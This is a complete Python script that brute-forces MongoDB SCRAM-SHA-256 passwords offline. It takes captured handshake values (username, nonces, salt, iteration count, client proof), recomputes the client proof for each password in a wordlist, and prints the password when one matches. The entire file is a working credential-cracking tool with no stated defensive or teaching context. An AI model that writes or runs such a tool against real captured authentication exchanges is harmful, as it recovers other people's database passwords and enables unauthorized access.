#!/usr/bin/python3

from scramp import ScramClient
import argparse
import os
import tqdm

def get_client_proof(mechanisms, username, password, client_nonce, combined_nonce, salt, iteration_count):
    client = ScramClient(mechanisms, username, password, c_nonce = client_nonce)
    client_first = client.get_client_first()
    client.set_server_first(f'r={combined_nonce},s={salt},i={iteration_count}')
    return client.get_client_final().split(',')[2]

def get_password(password_file, mechanisms, username, client_nonce, combined_nonce, salt, iteration_count, client_proof):
    with tqdm.tqdm(total = os.path.getsize(password_file)) as progress:
        with open(password_file, errors = 'ignore') as passwords:
            for password in passwords:
                password = password.strip()
                client_final = get_client_proof(mechanisms, username, password, client_nonce, combined_nonce, salt, iteration_count)
                if client_final == f'p={client_proof}':
                    return True, password
                progress.update(len(password))
    return False, None

def main():
    parser = argparse.ArgumentParser(description = 'mongodb scram brute force')
    parser.add_argument('--username')
    parser.add_argument('--client_nonce')
    parser.add_argument('--client_proof')
    parser.add_argument('--combined_nonce')
    parser.add_argument('--salt')
    parser.add_argument('--iteration_count', type = int)
    parser.add_argument('--mechanisms', default = 'SCRAM-SHA-256')
    parser.add_argument('--password_file')

    args = parser.parse_args()

    found, target_password = get_password(args.password_file, [args.mechanisms], args.username, args.client_nonce, args.combined_nonce, args.salt, args.iteration_count, args.client_proof)
    if found :
        print(f'Password found: {target_password}')

if __name__ == '__main__':
    main()
